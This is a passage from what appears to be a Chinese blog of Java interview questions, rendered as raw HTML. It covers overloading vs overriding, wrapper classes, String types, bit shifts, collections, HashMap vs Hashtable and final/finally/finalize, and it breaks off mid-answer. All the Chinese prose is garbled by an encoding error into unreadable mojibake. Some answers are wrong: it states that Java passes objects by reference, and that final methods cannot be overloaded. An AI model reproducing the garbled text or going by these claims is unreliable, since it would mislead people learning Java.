id="é‡è½½å’Œé‡å†™æœ‰ä»€ä¹ˆåŒºåˆ«">é‡è½½å’Œé‡å†™æœ‰ä»€ä¹ˆåŒºåˆ«</span></h2><p><strong>overrideï¼ˆé‡å†™ï¼‰</strong></p><ol><li><p>æ–¹æ³•åã€å‚æ•°ã€è¿”å›å€¼ç›¸åŒã€‚</p></li><li><p>å­ç±»æ–¹æ³•ä¸èƒ½ç¼©å°çˆ¶ç±»æ–¹æ³•çš„è®¿é—®æƒé™ã€‚</p></li><li><p>å­ç±»æ–¹æ³•ä¸èƒ½æŠ›å‡ºæ¯”çˆ¶ç±»æ–¹æ³•æ›´å¤šçš„å¼‚å¸¸(ä½†å­ç±»æ–¹æ³•å¯ä»¥ä¸æŠ›å‡ºå¼‚å¸¸)ã€‚</p></li><li><p>å­˜åœ¨äºçˆ¶ç±»å’Œå­ç±»ä¹‹é—´ã€‚</p></li><li><p>æ–¹æ³•è¢«å®šä¹‰ä¸ºfinalä¸èƒ½è¢«é‡å†™ã€‚</p></li></ol><p><strong>overloadï¼ˆé‡è½½ï¼‰</strong></p><ol><li><p>å‚æ•°ç±»å‹ã€ä¸ªæ•°ã€é¡ºåºè‡³å°‘æœ‰ä¸€ä¸ªä¸ç›¸åŒã€‚</p></li><li><p>ä¸èƒ½é‡è½½åªæœ‰è¿”å›å€¼ä¸åŒçš„æ–¹æ³•åã€‚</p></li><li><p>å­˜åœ¨äºçˆ¶ç±»å’Œå­ç±»ã€åŒç±»ä¸­ã€‚</p></li></ol><h2><span id="javaæœ‰å“ªäº›åŸºæœ¬æ•°æ®ç±»å‹">javaæœ‰å“ªäº›åŸºæœ¬æ•°æ®ç±»å‹ï¼Ÿ</span></h2><p>æ•´æ•°ç±»å‹ï¼š</p><p>byteï¼ˆ1Bï¼‰ shortï¼ˆ2Bï¼‰intï¼ˆ4Bï¼‰longï¼ˆ8Bï¼‰</p><p>æµ®ç‚¹ç±»å‹ï¼š</p><p>floatï¼ˆ4Bï¼‰doubleï¼ˆ8Bï¼‰</p><p>å­—ç¬¦ç±»å‹ï¼š</p><p>charï¼ˆ2Bï¼‰</p><p>å¸ƒå°”ç±»å‹ï¼š</p><p>boolean</p><h2><span id="intå’Œintegeræœ‰ä»€ä¹ˆåŒºåˆ«">intå’ŒIntegeræœ‰ä»€ä¹ˆåŒºåˆ«</span></h2><p>int æ˜¯åŸºæœ¬æ•°æ®ç±»å‹<br>Integeræ˜¯å…¶åŒ…è£…ç±»ï¼Œæ³¨æ„æ˜¯ä¸€ä¸ªç±»ã€‚<br>ä¸ºä»€ä¹ˆè¦æä¾›åŒ…è£…ç±»å‘¢ï¼Ÿï¼Ÿï¼Ÿ<br>ä¸€æ˜¯ä¸ºäº†åœ¨å„ç§ç±»å‹é—´è½¬åŒ–ï¼Œé€šè¿‡å„ç§æ–¹æ³•çš„è°ƒç”¨ã€‚å¦åˆ™ ä½ æ— æ³•ç›´æ¥é€šè¿‡å˜é‡è½¬åŒ–ã€‚<br>æ¯”å¦‚ï¼Œç°åœ¨intè¦è½¬ä¸ºString</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">0</span>;</span><br><span class="line">String result=Integer.toString(a);</span><br></pre></td></tr></table></figure><p>åœ¨javaä¸­åŒ…è£…ç±»ï¼Œæ¯”è¾ƒå¤šçš„ç”¨é€”æ˜¯ç”¨åœ¨äºå„ç§æ•°æ®ç±»å‹çš„è½¬åŒ–ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/é€šè¿‡åŒ…è£…ç±»æ¥å®ç°è½¬åŒ–çš„</span><br><span class="line"><span class="type">int</span> num=Integer.valueOf(<span class="string">&quot;12&quot;</span>);</span><br><span class="line"><span class="type">int</span> num2=Integer.parseInt(<span class="string">&quot;12&quot;</span>);</span><br><span class="line"><span class="type">double</span> num3=Double.valueOf(<span class="string">&quot;12.2&quot;</span>);</span><br><span class="line"><span class="type">double</span> num4=Double.parseDouble(<span class="string">&quot;12.2&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å…¶ä»–çš„ç±»ä¼¼ã€‚é€šè¿‡åŸºæœ¬æ•°æ®ç±»å‹çš„åŒ…è£…æ¥çš„valueOfå’ŒparseXXæ¥å®ç°Stringè½¬ä¸ºXX</span></span><br><span class="line">String a=String.valueOf(<span class="string">&quot;1234&quot;</span>);<span class="comment">//è¿™é‡Œæ‹¬å·ä¸­å‡ ä¹å¯ä»¥æ˜¯ä»»ä½•ç±»å‹</span></span><br><span class="line">String b=String.valueOf(<span class="literal">true</span>);</span><br><span class="line">String c=<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">12</span>).toString();<span class="comment">//é€šè¿‡åŒ…è£…ç±»çš„toString()ä¹Ÿå¯ä»¥</span></span><br><span class="line">String d=<span class="keyword">new</span> <span class="title class_">Double</span>(<span class="number">2.3</span>).toString();</span><br></pre></td></tr></table></figure><h2><span id="ä»€ä¹ˆæ˜¯è‡ªåŠ¨æ‹†è£…ç®±">ä»€ä¹ˆæ˜¯è‡ªåŠ¨æ‹†è£…ç®±</span></h2><p>é¦–å…ˆçŸ¥é“Stringæ˜¯å¼•ç”¨ç±»å‹ä¸æ˜¯åŸºæœ¬ç±»å‹ï¼Œå¼•ç”¨ç±»å‹å£°æ˜çš„å˜é‡æ˜¯æŒ‡è¯¥å˜é‡åœ¨å†…å­˜ä¸­å®é™…å­˜å‚¨çš„æ˜¯ä¸€ä¸ªå¼•ç”¨åœ°å€ï¼Œå®ä½“åœ¨å †ä¸­ã€‚å¼•ç”¨ç±»å‹åŒ…æ‹¬ç±»ã€æ¥å£ã€æ•°ç»„ç­‰ã€‚Stringç±»è¿˜æ˜¯finalä¿®é¥°çš„ã€‚</p><p>è€ŒåŒ…è£…ç±»å°±å±äºå¼•ç”¨ç±»å‹ï¼Œ<font color="red">è‡ªåŠ¨è£…ç®±å’Œæ‹†ç®±å°±æ˜¯åŸºæœ¬ç±»å‹å’Œå¼•ç”¨ç±»å‹ä¹‹é—´çš„è½¬æ¢</font>ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦è½¬æ¢ï¼Œå› ä¸ºåŸºæœ¬ç±»å‹è½¬æ¢ä¸ºå¼•ç”¨ç±»å‹åï¼Œå°±å¯ä»¥newå¯¹è±¡ï¼Œä»è€Œ<font color="blue">è°ƒç”¨åŒ…è£…ç±»ä¸­å°è£…å¥½çš„æ–¹æ³•</font>è¿›è¡ŒåŸºæœ¬ç±»å‹ä¹‹é—´çš„è½¬æ¢æˆ–è€…toStringï¼ˆå½“ç„¶ç”¨ç±»åç›´æ¥è°ƒç”¨ä¹Ÿå¯ä»¥ï¼Œä¾¿äºä¸€çœ¼çœ‹å‡ºè¯¥æ–¹æ³•æ˜¯é™æ€çš„ï¼‰ï¼Œè¿˜æœ‰å°±æ˜¯å¦‚æœé›†åˆä¸­æƒ³å­˜æ”¾åŸºæœ¬ç±»å‹ï¼Œ<font color="orange">æ³›å‹çš„é™å®šç±»å‹åªèƒ½æ˜¯å¯¹åº”çš„åŒ…è£…ç±»å‹</font>ã€‚</p><h2><span id="æ•°ç»„æœ‰æ²¡æœ‰lengthæ–¹æ³•stringæœ‰æ²¡æœ‰lengthæ–¹æ³•">æ•°ç»„æœ‰æ²¡æœ‰length()æ–¹æ³•ï¼ŸStringæœ‰æ²¡æœ‰length()æ–¹æ³•ï¼Ÿ</span></h2><p>1ã€æ•°ç»„æ²¡æœ‰length()æ–¹æ³•ï¼Œä½†æœ‰lengthå±æ€§</p><p>2ã€Stringç±»æœ‰length() æ–¹æ³•</p><h2><span id="stringå’Œstringbuilder-stringbufferçš„åŒºåˆ«">Stringå’ŒStringBuilderã€StringBufferçš„åŒºåˆ«ï¼Ÿ</span></h2><p>1ã€String å­—ç¬¦ä¸²å¸¸é‡(finalä¿®é¥°ï¼Œä¸å¯è¢«ç»§æ‰¿)ï¼ŒStringæ˜¯å¸¸é‡ï¼Œå½“åˆ›å»ºä¹‹åå³ä¸èƒ½æ›´æ”¹ã€‚(å¯ä»¥é€šè¿‡StringBufferå’ŒStringBuilderåˆ›å»ºStringå¯¹è±¡(å¸¸ç”¨çš„ä¸¤ä¸ªå­—ç¬¦ä¸²æ“ä½œç±»)ã€‚)</p><p>2ã€StringBuffer å­—ç¬¦ä¸²å˜é‡ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰,å…¶ä¹Ÿæ˜¯finalç±»åˆ«çš„ï¼Œä¸å…è®¸è¢«ç»§æ‰¿ï¼Œå…¶ä¸­çš„ç»å¤§å¤šæ•°æ–¹æ³•éƒ½è¿›è¡Œäº†åŒæ­¥å¤„ç†ï¼ŒåŒ…æ‹¬å¸¸ç”¨çš„Appendæ–¹æ³•ä¹Ÿåšäº†åŒæ­¥å¤„ç†(synchronizedä¿®é¥°)ã€‚å…¶è‡ªjdk1.0èµ·å°±å·²ç»å‡ºç°ã€‚å…¶toStringæ–¹æ³•ä¼šè¿›è¡Œå¯¹è±¡ç¼“å­˜ï¼Œä»¥å‡å°‘å…ƒç´ å¤åˆ¶å¼€é”€ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; </span><br><span class="line">    <span class="keyword">if</span> (toStringCache == <span class="literal">null</span>) &#123;        </span><br><span class="line">        toStringCache = Arrays.copyOfRange(value, <span class="number">0</span>, count);    </span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(toStringCache, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3ã€StringBuilder å­—ç¬¦ä¸²å˜é‡ï¼ˆéçº¿ç¨‹å®‰å…¨ï¼‰å…¶è‡ªjdk1.5èµ·å¼€å§‹å‡ºç°ã€‚ä¸StringBufferä¸€æ ·éƒ½ç»§æ‰¿å’Œå®ç°äº†åŒæ ·çš„æ¥å£å’Œç±»ï¼Œæ–¹æ³•é™¤äº†æ²¡ä½¿ç”¨synchä¿®é¥°ä»¥å¤–åŸºæœ¬ä¸€è‡´ï¼Œä¸åŒä¹‹å¤„åœ¨äºæœ€åtoStringçš„æ—¶å€™ï¼Œä¼šç›´æ¥è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;<span class="comment">// Create a copy, donâ€™t share the arrayreturn new String(value, 0, count);&#125;</span></span><br></pre></td></tr></table></figure><h2><span id="stringèƒ½è¢«ç»§æ‰¿å—ä¸ºä»€ä¹ˆ">Stringèƒ½è¢«ç»§æ‰¿å—ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</span></h2><p>ä¸å¯ä»¥ï¼Œå› ä¸ºStringç±»æœ‰finalä¿®é¥°ç¬¦ï¼Œè€Œfinalä¿®é¥°çš„ç±»æ˜¯ä¸èƒ½è¢«ç»§æ‰¿çš„ï¼Œå®ç°ç»†èŠ‚ä¸å…è®¸æ”¹å˜ã€‚å¹³å¸¸æˆ‘ä»¬å®šä¹‰çš„String str&#x3D;â€aâ€;å…¶å®å’ŒString str&#x3D;new String(â€œaâ€)è¿˜æ˜¯æœ‰å·®å¼‚çš„ã€‚</p><p>å‰è€…é»˜è®¤è°ƒç”¨çš„æ˜¯String.valueOfæ¥è¿”å›Stringå®ä¾‹å¯¹è±¡ï¼Œè‡³äºè°ƒç”¨å“ªä¸ªåˆ™å–å†³äºä½ çš„èµ‹å€¼ï¼Œæ¯”å¦‚String num&#x3D;1,è°ƒç”¨çš„æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">valueOf</span><span class="params">(<span class="type">int</span> i)</span> &#123;<span class="keyword">return</span> Integer.toString(i);&#125;</span><br></pre></td></tr></table></figure><p>åè€…åˆ™æ˜¯è°ƒç”¨å¦‚ä¸‹éƒ¨åˆ†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">String</span><span class="params">(String original)</span> &#123;<span class="built_in">this</span>.value = original.value;<span class="built_in">this</span>.hash = original.hash;&#125; </span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬çš„å˜é‡éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªcharæ•°ç»„ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">char</span> value[];</span><br></pre></td></tr></table></figure><h2><span id="ä»€ä¹ˆæ˜¯å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’">ä»€ä¹ˆæ˜¯å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’</span></h2><p>å€¼ä¼ é€’æ˜¯å¯¹åŸºæœ¬å‹å˜é‡è€Œè¨€çš„,ä¼ é€’çš„æ˜¯è¯¥å˜é‡çš„ä¸€ä¸ªå‰¯æœ¬,æ”¹å˜å‰¯æœ¬ä¸å½±å“åŸå˜é‡.<br>å¼•ç”¨ä¼ é€’ä¸€èˆ¬æ˜¯å¯¹äºå¯¹è±¡å‹å˜é‡è€Œè¨€çš„,ä¼ é€’çš„æ˜¯è¯¥å¯¹è±¡åœ°å€çš„ä¸€ä¸ªå‰¯æœ¬, å¹¶ä¸æ˜¯åŸå¯¹è±¡æœ¬èº« ã€‚<br>ä¸€èˆ¬è®¤ä¸º,javaå†…åŸºæœ¬ç±»å‹çš„ä¼ é€’éƒ½æ˜¯å€¼ä¼ é€’. javaä¸­å®ä¾‹å¯¹è±¡çš„ä¼ é€’æ˜¯å¼•ç”¨ä¼ é€’ ã€‚</p><h2><span id="javaç±»çš„å®ä¾‹åŒ–é¡ºåº">Javaç±»çš„å®ä¾‹åŒ–é¡ºåº</span></h2><p>1ï¼ çˆ¶ç±»é™æ€æˆå‘˜å’Œé™æ€åˆå§‹åŒ–å— ï¼ŒæŒ‰åœ¨ä»£ç ä¸­å‡ºç°çš„é¡ºåºä¾æ¬¡æ‰§è¡Œ<br>2ï¼ å­ç±»é™æ€æˆå‘˜å’Œé™æ€åˆå§‹åŒ–å— ï¼ŒæŒ‰åœ¨ä»£ç ä¸­å‡ºç°çš„é¡ºåºä¾æ¬¡æ‰§è¡Œ<br>3ï¼ çˆ¶ç±»å®ä¾‹æˆå‘˜å’Œå®ä¾‹åˆå§‹åŒ–å— ï¼ŒæŒ‰åœ¨ä»£ç ä¸­å‡ºç°çš„é¡ºåºä¾æ¬¡æ‰§è¡Œ<br>4ï¼ çˆ¶ç±»æ„é€ æ–¹æ³•<br>5ï¼ å­ç±»å®ä¾‹æˆå‘˜å’Œå®ä¾‹åˆå§‹åŒ–å— ï¼ŒæŒ‰åœ¨ä»£ç ä¸­å‡ºç°çš„é¡ºåºä¾æ¬¡æ‰§è¡Œ<br>6ï¼ å­ç±»æ„é€ æ–¹æ³•</p><p>ç»“è®ºï¼šå¯¹è±¡åˆå§‹åŒ–çš„é¡ºåºï¼Œå…ˆé™æ€æ–¹æ³•ï¼Œå†æ„é€ æ–¹æ³•ï¼Œæ¯ä¸ªåˆæ˜¯å…ˆåŸºç±»åå­ç±»ã€‚</p><h2><span id="javaä¸­ç¬¦å·gtgtå’Œgtgtgtæœ‰ä»€ä¹ˆåŒºåˆ«">Javaä¸­ç¬¦å·&gt;&gt;å’Œ&gt;&gt;&gt;æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</span></h2><p>&gt;&gt;ï¼šå¸¦ç¬¦å·å³ç§»ã€‚æ­£æ•°å³ç§»é«˜ä½è¡¥0ï¼Œè´Ÿæ•°å³ç§»é«˜ä½è¡¥1ã€‚æ¯”å¦‚ï¼š</p><p>4 &gt;&gt; 1ï¼Œç»“æœæ˜¯2ï¼›-4 &gt;&gt; 1ï¼Œç»“æœæ˜¯-2ã€‚-2 &gt;&gt; 1ï¼Œç»“æœæ˜¯-1ã€‚</p><p>&gt;&gt;&gt;ï¼šæ— ç¬¦å·å³ç§»ã€‚æ— è®ºæ˜¯æ­£æ•°è¿˜æ˜¯è´Ÿæ•°ï¼Œé«˜ä½é€šé€šè¡¥0ã€‚</p><p>å¯¹äºæ­£æ•°è€Œè¨€ï¼Œ&gt;&gt;å’Œ&gt;&gt;&gt;æ²¡åŒºåˆ«ã€‚</p><p>å¯¹äºè´Ÿæ•°è€Œè¨€ï¼Œ-2 &gt;&gt;&gt; 1ï¼Œç»“æœæ˜¯2147483647ï¼ˆInteger.MAX_VALUEï¼‰ï¼Œ-1 &gt;&gt;&gt; 1ï¼Œç»“æœæ˜¯2147483647ï¼ˆInteger.MAX_VALUEï¼‰ã€‚</p><h2><span id="javaé›†åˆæ¡†æ¶çš„åŸºç¡€æ¥å£æœ‰å“ªäº›">Javaé›†åˆæ¡†æ¶çš„åŸºç¡€æ¥å£æœ‰å“ªäº›ï¼Ÿ</span></h2><p>Collectionï¼š</p><p>ä¸ºé›†åˆå±‚çº§çš„æ ¹æ¥å£ã€‚ä¸€ä¸ªé›†åˆä»£è¡¨ä¸€ç»„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡å³ä¸ºå®ƒçš„å…ƒç´ ã€‚Javaå¹³å°ä¸æä¾›è¿™ä¸ªæ¥å£ä»»ä½•ç›´æ¥çš„å®ç°ã€‚</p><p>Setï¼š</p><p>æ˜¯ä¸€ä¸ªä¸èƒ½åŒ…å«é‡å¤å…ƒç´ çš„é›†åˆã€‚è¿™ä¸ªæ¥å£å¯¹æ•°å­¦é›†åˆæŠ½è±¡è¿›è¡Œå»ºæ¨¡ï¼Œè¢«ç”¨æ¥ä»£è¡¨é›†åˆï¼Œå°±å¦‚ä¸€å‰¯ç‰Œã€‚</p><p>Listï¼š</p><p>æ˜¯ä¸€ä¸ªæœ‰åºé›†åˆï¼Œå¯ä»¥åŒ…å«é‡å¤å…ƒç´ ã€‚ä½ å¯ä»¥é€šè¿‡å®ƒçš„ç´¢å¼•æ¥è®¿é—®ä»»ä½•å…ƒç´ ã€‚Listæ›´åƒé•¿åº¦åŠ¨æ€å˜æ¢çš„æ•°ç»„ã€‚</p><p>Mapï¼š</p><p>æ˜¯ä¸€ä¸ªå°†keyæ˜ å°„åˆ°valueçš„å¯¹è±¡.ä¸€ä¸ªMapä¸èƒ½åŒ…å«é‡å¤çš„keyï¼šæ¯ä¸ªkeyæœ€å¤šåªèƒ½æ˜ å°„ä¸€ä¸ªvalueã€‚</p><p>ä¸€äº›å…¶å®ƒçš„æ¥å£æœ‰Queueã€Dequeueã€SortedSetã€SortedMapå’ŒListIteratorã€‚</p><h2><span id="arraylist-å’Œ-linkedlist-æœ‰ä»€ä¹ˆåŒºåˆ«">ArrayList å’Œ LinkedList æœ‰ä»€ä¹ˆåŒºåˆ«?</span></h2><p>ArrayListå’ŒLinkedListéƒ½å®ç°äº†Listæ¥å£ï¼Œæœ‰ä»¥ä¸‹çš„ä¸åŒç‚¹ï¼š</p><p>1ã€ArrayListæ˜¯åŸºäºç´¢å¼•çš„æ•°æ®æ¥å£ï¼Œå®ƒçš„åº•å±‚æ˜¯æ•°ç»„ã€‚å®ƒå¯ä»¥ä»¥O(1)æ—¶é—´å¤æ‚åº¦å¯¹å…ƒç´ è¿›è¡Œéšæœºè®¿é—®ã€‚ä¸æ­¤å¯¹åº”ï¼ŒLinkedListæ˜¯ä»¥å…ƒç´ åˆ—è¡¨çš„å½¢å¼å­˜å‚¨å®ƒçš„æ•°æ®ï¼Œæ¯ä¸€ä¸ªå…ƒç´ éƒ½å’Œå®ƒçš„å‰ä¸€ä¸ªå’Œåä¸€ä¸ªå…ƒç´ é“¾æ¥åœ¨ä¸€èµ·ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæŸ¥æ‰¾æŸä¸ªå…ƒç´ çš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n)ã€‚</p><p>2ã€ç›¸å¯¹äºArrayListï¼ŒLinkedListçš„æ’å…¥ï¼Œæ·»åŠ ï¼Œåˆ é™¤æ“ä½œé€Ÿåº¦æ›´å¿«ï¼Œå› ä¸ºå½“å…ƒç´ è¢«æ·»åŠ åˆ°é›†åˆä»»æ„ä½ç½®çš„æ—¶å€™ï¼Œä¸éœ€è¦åƒæ•°ç»„é‚£æ ·é‡æ–°è®¡ç®—å¤§å°æˆ–è€…æ˜¯æ›´æ–°ç´¢å¼•ã€‚</p><p>3ã€LinkedListæ¯”ArrayListæ›´å å†…å­˜ï¼Œå› ä¸ºLinkedListä¸ºæ¯ä¸€ä¸ªèŠ‚ç‚¹å­˜å‚¨äº†ä¸¤ä¸ªå¼•ç”¨ï¼Œä¸€ä¸ªæŒ‡å‘å‰ä¸€ä¸ªå…ƒç´ ï¼Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚</p><h2><span id="hashmap-ä¸hashtableæœ‰ä»€ä¹ˆåŒºåˆ«">HashMap ä¸HashTableæœ‰ä»€ä¹ˆåŒºåˆ«</span></h2><h3><span id="hashtable"><strong>HashTable</strong></span></h3><ul><li>åº•å±‚æ•°ç»„+é“¾è¡¨å®ç°ï¼Œæ— è®ºkeyè¿˜æ˜¯valueéƒ½<strong>ä¸èƒ½ä¸ºnull</strong>ï¼Œçº¿ç¨‹<strong>å®‰å…¨</strong>ï¼Œå®ç°çº¿ç¨‹å®‰å…¨çš„æ–¹å¼æ˜¯åœ¨ä¿®æ”¹æ•°æ®æ—¶é”ä½æ•´ä¸ªHashTableï¼Œæ•ˆç‡ä½ï¼ŒConcurrentHashMapåšäº†ç›¸å…³ä¼˜åŒ–</li><li>åˆå§‹sizeä¸º<strong>11</strong>ï¼Œæ‰©å®¹ï¼šnewsize &#x3D; olesize*2+1</li><li>è®¡ç®—indexçš„æ–¹æ³•ï¼šindex &#x3D; (hash &amp; 0x7FFFFFFF) % tab.length</li></ul><h3><span id="hashmap"><strong>HashMap</strong></span></h3><ul><li>åº•å±‚æ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘å®ç°ï¼Œå¯<strong>ä»¥å­˜å‚¨nullé”®å’Œnullå€¼</strong>ï¼Œçº¿ç¨‹<strong>ä¸å®‰å…¨</strong></li><li>åˆå§‹sizeä¸º<strong>16</strong>ï¼Œæ‰©å®¹ï¼šnewsize &#x3D; oldsize*2ï¼Œsizeä¸€å®šä¸º2çš„næ¬¡å¹‚</li><li>æ‰©å®¹é’ˆå¯¹æ•´ä¸ªMapï¼Œæ¯æ¬¡æ‰©å®¹æ—¶ï¼ŒåŸæ¥æ•°ç»„ä¸­çš„å…ƒç´ ä¾æ¬¡é‡æ–°è®¡ç®—å­˜æ”¾ä½ç½®ï¼Œå¹¶é‡æ–°æ’å…¥</li><li>å½“Mapä¸­å…ƒç´ æ€»æ•°è¶…è¿‡Entryæ•°ç»„çš„75%ï¼Œè§¦å‘æ‰©å®¹æ“ä½œï¼Œä¸ºäº†å‡å°‘é“¾è¡¨é•¿åº¦ï¼Œå…ƒç´ åˆ†é…æ›´å‡åŒ€</li><li>å½“é“¾è¡¨é•¿åº¦è¶…è¿‡8å°±ä¼šè½¬æ¢ä¸ºçº¢é»‘æ ‘ï¼Œçº¢é»‘æ ‘ä¸ªæ•°ä½äº6å°±ä¼šè½¬æ¢æˆé“¾è¡¨</li><li>è®¡ç®—indexæ–¹æ³•ï¼šindex &#x3D; hash &amp; (tab.length â€“ 1)</li></ul><h2><span id="final-finally-finalizeæœ‰ä»€ä¹ˆåŒºåˆ«">final, finally, finalizeæœ‰ä»€ä¹ˆåŒºåˆ«</span></h2><p><strong>final</strong></p><p>ä¿®é¥°ç¬¦ï¼ˆå…³é”®å­—ï¼‰å¦‚æœä¸€ä¸ªç±»è¢«å£°æ˜ä¸ºfinalï¼Œæ„å‘³ç€å®ƒä¸èƒ½å†æ´¾ç”Ÿå‡ºæ–°çš„å­ç±»ï¼Œä¸èƒ½ä½œä¸ºçˆ¶ç±»è¢«ç»§æ‰¿ã€‚å› æ­¤ä¸€ä¸ªç±»ä¸èƒ½æ—¢è¢«å£°æ˜ä¸º abstractçš„ï¼Œåˆè¢«å£°æ˜ä¸ºfinalçš„ã€‚å°†å˜é‡æˆ–æ–¹æ³•å£°æ˜ä¸ºfinalï¼Œå¯ä»¥ä¿è¯å®ƒä»¬åœ¨ä½¿ç”¨ä¸­ä¸è¢«æ”¹å˜ã€‚è¢«å£°æ˜ä¸ºfinalçš„å˜é‡å¿…é¡»åœ¨å£°æ˜æ—¶ç»™å®šåˆå€¼ï¼Œè€Œåœ¨ä»¥åçš„å¼•ç”¨ä¸­åªèƒ½è¯»å–ï¼Œä¸å¯ä¿®æ”¹ã€‚è¢«å£°æ˜ä¸ºfinalçš„æ–¹æ³•ä¹ŸåŒæ ·åªèƒ½ä½¿ç”¨ï¼Œä¸èƒ½é‡è½½ ã€‚</p><p><strong>finally</strong></p><p>åœ¨å¼‚å¸¸å¤„ç†æ—¶æä¾› finally å—æ¥æ‰§è¡Œä»»ä½•æ¸…é™¤æ“ä½œã€‚å¦‚æœæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œé‚£ä¹ˆç›¸åŒ¹é…çš„ catch å­å¥å°±ä¼šæ‰§è¡Œï¼Œç„¶åæ§åˆ¶å°±ä¼šè¿›å…¥ finally å—ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚ </p><p><strong>finalize</strong></p><p>æ–¹æ³•åã€‚Java æŠ€æœ¯å…è®¸ä½¿ç”¨ finalize() æ–¹æ³•åœ¨åƒåœ¾æ”¶é›†å™¨å°†å¯¹è±¡ä»å†…å­˜ä¸­æ¸…é™¤å‡ºå»ä¹‹å‰åšå¿…è¦çš„æ¸…ç†å·¥ä½œã€‚è¿™ä¸ªæ–¹æ³•æ˜¯ç”±åƒåœ¾æ”¶é›†å™¨åœ¨ç¡®å®šè¿™ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨æ—¶å¯¹è¿™ä¸ªå¯¹è±¡è°ƒç”¨çš„ã€‚å®ƒæ˜¯åœ¨ Objectç±»ä¸­å®šä¹‰çš„ï¼Œå› æ­¤æ‰€æœ‰çš„ç±»éƒ½ç»§æ‰¿äº†å®ƒã€‚å­ç±»è¦†ç›– finalize() æ–¹æ³•ä»¥æ•´ç†ç³»ç»Ÿèµ„æºæˆ–è€…æ‰§è¡Œå…¶ä»–æ¸…ç†å·¥ä½œã€‚finalize() æ–¹æ³•æ˜¯åœ¨åƒåœ¾æ”¶é›†å™¨åˆ é™¤å¯¹è±¡ä¹‹å‰å¯¹è¿™ä¸ªå¯¹è±¡è°ƒç”¨çš„ã€‚</p><h2><span id="javaä¸­çš„throw-å’Œ-throwså…³é”®å­—æœ‰ä»€ä¹ˆåŒºåˆ«">javaä¸­çš„throw å’Œ throwså…³é”®å­—æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        </span><br><span class="line">        <span class="keyword">try</span> &#123;            </span><br><span class="line">            test(args);        </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;            </span><br><span class="line">            e.printStackTrace();        </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;        </span><br><span class="line">        <span class="keyword">if</span> (args == <span class="literal">null</span> || args.length != <span class="number">1</span> || !<span class="string">&quot;true&quot;</span>.equals(args[<span class="number">0</span>])) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid argument!&quot;</span>);        </span><br><span class="line">         &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒºåˆ«ï¼š</p><p>throwæ˜¯è¯­å¥æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œä¸€èˆ¬æ˜¯åœ¨ä»£ç 